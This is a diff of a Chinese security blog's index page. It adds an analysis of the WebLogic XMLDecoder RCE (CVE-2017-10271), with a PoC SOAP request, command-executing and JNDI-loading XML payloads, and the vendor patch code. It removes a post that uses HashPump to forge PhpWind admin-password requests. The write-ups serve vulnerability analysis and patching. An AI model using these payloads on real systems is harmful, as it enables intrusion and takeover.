@@ -334,6 +334,189 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/23/Weblogic XMLDecoder RCE分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/12/23/Weblogic XMLDecoder RCE分析/" itemprop="url">
+                  Weblogic XMLDecoder RCE分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-23T08:37:04+08:00">
+                2017-12-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/12/23/Weblogic XMLDecoder RCE分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/12/23/Weblogic XMLDecoder RCE分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/12/23/Weblogic XMLDecoder RCE分析/" class="leancloud_visitors" data-flag-title="Weblogic XMLDecoder RCE分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>挖矿确实太火，现在只要存在RCE漏洞就会有矿机的身影，这不weblogic又火了一把。这次矿机使用的PoC是wls wsat模块的RCE漏洞，这个漏洞的核心就是XMLDecoder的反序列化漏洞，关于XMLDecoder反序列化的漏洞在2013年就被广泛传播，这次的漏洞是由于官方修复不完善导致被绕过。</p>
+<h2 id="1-补丁分析"><a href="#1-补丁分析" class="headerlink" title="1 补丁分析"></a>1 补丁分析</h2><p>首先来看下weblogic的历史补丁，四月份补丁通告：<br><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html" target="_blank" rel="external">http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html</a><br>这里面主要关注CVE-2017-3506，这是web service模块的漏洞。</p>
+<p>10月份补丁通告：<br><a href="https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html" target="_blank" rel="external">https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html</a><br>主要关注CVE-2017-10271，是WLS Security组建的漏洞，英文描述如下：<br>A remote user can exploit a flaw in the Oracle WebLogic Server WLS Security component to gain elevated privileges [CVE-2017-10271].这是CVE-2017-10271的描述信息。<br>测试的poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: 192.168.3.216:7001</div><div class="line">Accept-Encoding: identity</div><div class="line">Content-Length: 683</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Accept: */*</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0</div><div class="line">Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</div><div class="line">Connection: keep-alive</div><div class="line">Cache-Control: max-age=0</div><div class="line">Content-Type: text/xml</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</div><div class="line">  &lt;soapenv:Header&gt;</div><div class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</div><div class="line">              。。。。</div><div class="line">          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</div><div class="line">        &lt;/java&gt;</div><div class="line">      &lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">  &lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>对于poc中uri中<code>/wls-wsat/CoordinatorPortType</code> 可以换成CoordinatorPortType11等wsat 这个webservice服务中存在的其他uri<br>执行的效果图如下：<br><img src="/images/2017-10271-0.png" alt="0"></p>
+<p>跟踪到底这还是XMLDecoder的漏洞，下面来分析补丁代码：首先来看3506的补丁的分析，在文件weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中，<br>添加了validate方法，方法的实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line"></div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">         SAXParser parser = factory.newSAXParser();</div><div class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</div><div class="line">               &#125;</div><div class="line">            &#125;</div><div class="line">         &#125;);</div><div class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</div><div class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</div><div class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</div><div class="line">      &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>简单来说就是在解析xml的过程中，如果Element字段值为Object就抛出异常，这简直太脑残了，所以马上就有了CVE-2017-10271。我前段时间分析Oracle Weblogic十月份的补丁的时候看到WorkContextXmlInputAdapter 相关代码时只关注了这块dos的漏洞，没看到10271添加的对new，method，void的去除，还想当然的以为自己找到0day了呢。因为可以通过其他方式绕过，比如典型的就是将object改为void，这是挖矿的人采用的poc，我也想到了，当然也还可以通过new关键字来创建反序列化执行的poc，下面简单示例一下通过new关键字来执行命令：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">new</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">"start"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">new</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>至于为什么XMLDecoder在解析的过程中能执行代码呢，大家可以以如下测试用例进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">    &lt;void class=&quot;com.sun.rowset.JdbcRowSetImpl&quot;&gt;</div><div class="line">    &lt;void property=&quot;dataSourceName&quot;&gt;</div><div class="line">        &lt;string&gt;rmi://localhost:1099/Exploit&lt;/string&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">    &lt;void property=&quot;autoCommit&quot;&gt;</div><div class="line">        &lt;boolean&gt;true&lt;/boolean&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">&lt;/java&gt;</div></pre></td></tr></table></figure></p>
+<p>是不是觉得变种太多，写法太灵活了，比XStream远程执行代码的要求还低。根据如上poc首先生成JdbcRowSetImpl的实例，接着调用该实例的set方法来初始化该实例的属性，当调用完setAutoCommit接口的时候就会根据dataSourceName的值去远程加载一个类初始化。</p>
+<p>针对上面的PoC，官方放出了10271的补丁，补丁如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line"></div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      SAXParser parser = factory.newSAXParser();</div><div class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</div><div class="line"></div><div class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</div><div class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</div><div class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</div><div class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line"></div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</div><div class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</div><div class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</div><div class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</div><div class="line">                  &#125;</div></pre></td></tr></table></figure></p>
+<p>这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。如下的测试用例就不可执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">    &lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">        &lt;string&gt;calc&lt;/string&gt;&lt;method name=&quot;start&quot; /&gt;</div><div class="line">    &lt;/new&gt;</div><div class="line">&lt;/java&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="2-动态调试"><a href="#2-动态调试" class="headerlink" title="2 动态调试"></a>2 动态调试</h2><p>为了更好的理解这个漏洞，我们通过本地的weblogic动态调试一番，PoC还是前面提到的，具体的调用栈如下：<br><img src="/images/2017-10271-1.png" alt="1"><br><img src="/images/2017-10271-2.png" alt="2"><br><img src="/images/2017-10271-3.png" alt="3"></p>
+<p>调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> NextAction <span class="title">processRequest</span><span class="params">(Packet var1)</span> </span>&#123;</div><div class="line">   <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">false</span>;</div><div class="line">   <span class="keyword">if</span>(var1.getMessage() != <span class="keyword">null</span>) &#123;</div><div class="line">      HeaderList var2 = var1.getMessage().getHeaders();</div><div class="line">      Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="keyword">true</span>);</div><div class="line">      <span class="keyword">if</span>(var3 != <span class="keyword">null</span>) &#123;</div><div class="line">         <span class="keyword">this</span>.readHeaderOld(var3);</div><div class="line">         <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">true</span>;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      Header var4 = var2.get(<span class="keyword">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="keyword">true</span>);</div><div class="line">      <span class="keyword">if</span>(var4 != <span class="keyword">null</span>) &#123;</div><div class="line">         <span class="keyword">this</span>.readHeader(var4);</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">readHeaderOld</span><span class="params">(Header var1)</span> </span>&#123;</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      XMLStreamReader var2 = var1.readHeader();</div><div class="line">      var2.nextTag();</div><div class="line">      var2.nextTag();</div><div class="line">      XMLStreamReaderToXMLStreamWriter var3 = <span class="keyword">new</span> XMLStreamReaderToXMLStreamWriter();</div><div class="line">      ByteArrayOutputStream var4 = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line">      XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</div><div class="line">      var3.bridge(var2, var5);</div><div class="line">      var5.close();</div><div class="line">      WorkContextXmlInputAdapter var6 = <span class="keyword">new</span> WorkContextXmlInputAdapter(<span class="keyword">new</span> ByteArrayInputStream(var4.toByteArray()));</div><div class="line">      <span class="keyword">this</span>.receive(var6);</div><div class="line">   &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var7);</div><div class="line">   &#125; <span class="keyword">catch</span> (IOException var8) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var8);</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在上述代码中ByteArrayOutputStream var4会被填充为PoC实际执行部分代码即：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></div><div class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></div><div class="line">             。。。</div><div class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>接着这部分xml会被传递到XMLDecoder的readObject方法中从而导致反序列化远程代码执行。</p>
+<p>总之，尽快打上Weblogic 10月份的补丁。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2026,187 +2209,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" itemprop="url">
-                  Phpwind利用hash长度扩展攻击修改后台密码getshell
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-08-01T15:38:36+08:00">
-                2016-08-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Php/" itemprop="url" rel="index">
-                    <span itemprop="name">Php</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" class="leancloud_visitors" data-flag-title="Phpwind利用hash长度扩展攻击修改后台密码getshell">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#1 哈希长度扩展攻击</p>
-<p>##1.1 简介<br>哈希长度扩张攻击（hash length attack）是一类针对某些哈希函数可以额外添加一些信息的攻击手段，适用于已经确定哈希值和密钥长度的情况。哈希值基本表示如下H（密钥||消息），即知道了哈希值和密钥的长度，可以推出H（密钥||消息||padding||append）的哈希值，padding是要填充的字段，append则是要附加的消息。其实如果不知道密钥长度，可通过暴力猜解得到，已知的有长度扩展攻击缺陷的函数有MD5，SHA-1，SHA-256等等,详细的攻击原理可参考<a href="Everything%20you%20need%20to%20know%20about%20hash%20length%20extension%20attacks">Everything you need to know about hash length extension attacks</a></p>
-<p>##1.2 利用<br>这里推荐有python扩展的HashPump，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。<br>安装：<code>pip install hashpumpy</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# hashpump --help</div><div class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</div><div class="line">     HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</div><div class="line">     -h --help          Display this message.</div><div class="line">     -t --test          Run tests to verify each algorithm is operating properly.</div><div class="line">     -s --signature     The signature from known message.</div><div class="line">     -d --data          The data from the known message.</div><div class="line">     -a --additional    The information you would like to add to the known message.</div><div class="line">     -k --keylength     The length in bytes of the key being used to sign the original message with.</div><div class="line">     Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</div><div class="line">     &lt;Developed by bwall(@botnet_hunter)&gt;</div></pre></td></tr></table></figure></p>
-<p>-s参数对应的就是H(密钥||消息)中的哈希值，-d参数对应着消息，-k参数对应着密钥的长度，-a则是要附加的消息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# hashpump -s &quot;ebfe0fff1806cfe6186c6a0b172e8148&quot; -d &quot;1465895192adoAvatarcavatarmapitypeflashuid2uidundefined&quot; -k 32 -a namespacesiteaeditUsercusermapipasswordGongFang9uid1</div><div class="line">4daee9a61955a1c17319f4c1664d11df</div><div class="line">1465895192adoAvatarcavatarmapitypeflashuid2uidundefined\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x00\x00\x00namespacesiteaeditUsercusermapipasswordGongFang9uid1</div></pre></td></tr></table></figure></p>
-<p>最后提供一个哈希扩展攻击在线工具：<a href="http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2" target="_blank" rel="external">http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2</a>]</p>
-<p>#2 phpwind利用点分析<br>phpwind会在每次请求的时候校验密钥，具体的对应函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">public  function beforeAction($handlerAdapter) &#123;</div><div class="line">	parent::beforeAction($handlerAdapter);</div><div class="line">	$charset = &apos;utf-8&apos;;</div><div class="line">	$_windidkey = $this-&gt;getInput(&apos;windidkey&apos;, &apos;get&apos;);</div><div class="line">	$_time = (int)$this-&gt;getInput(&apos;time&apos;, &apos;get&apos;);</div><div class="line">	$_clientid = (int)$this-&gt;getInput(&apos;clientid&apos;, &apos;get&apos;);</div><div class="line">	if (!$_time || !$_clientid) $this-&gt;output(WindidError::FAIL);</div><div class="line">	$clent = $this-&gt;_getAppDs()-&gt;getApp($_clientid);</div><div class="line">	if (!$clent) $this-&gt;output(WindidError::FAIL);</div><div class="line">	if (WindidUtility::appKey($clent[&apos;id&apos;], $_time, $clent[&apos;secretkey&apos;], $this-&gt;getRequest()-&gt;getGet(null), $this-&gt;getRequest()-&gt;getPost()) != $_windidkey)  $this-&gt;output(WindidError::FAIL);</div><div class="line">	</div><div class="line">	$time = Pw::getTime();</div><div class="line">	if ($time - $_time &gt; 1200) $this-&gt;output(WindidError::TIMEOUT);</div><div class="line">	$this-&gt;appid = $_clientid;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在这个函数中会提取windidkey，并且和<code>WindidUtility::appKey</code>生成的结果做对比，不同则退出，如过相同继续判断时间是否超时，超时也退出，appKey的实现如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">public static function appKey($apiId, $time, $secretkey, $get, $post) &#123;</div><div class="line">	// 注意这里需要加上__data，因为下面的buildRequest()里加了。</div><div class="line">	$array = array(&apos;windidkey&apos;, &apos;clientid&apos;, &apos;time&apos;, &apos;_json&apos;, &apos;jcallback&apos;, &apos;csrf_token&apos;,</div><div class="line">				   &apos;Filename&apos;, &apos;Upload&apos;, &apos;token&apos;, &apos;__data&apos;);</div><div class="line">	$str = &apos;&apos;;</div><div class="line">	ksort($get);</div><div class="line">	ksort($post);</div><div class="line">	foreach ($get AS $k=&gt;$v) &#123;</div><div class="line">		if 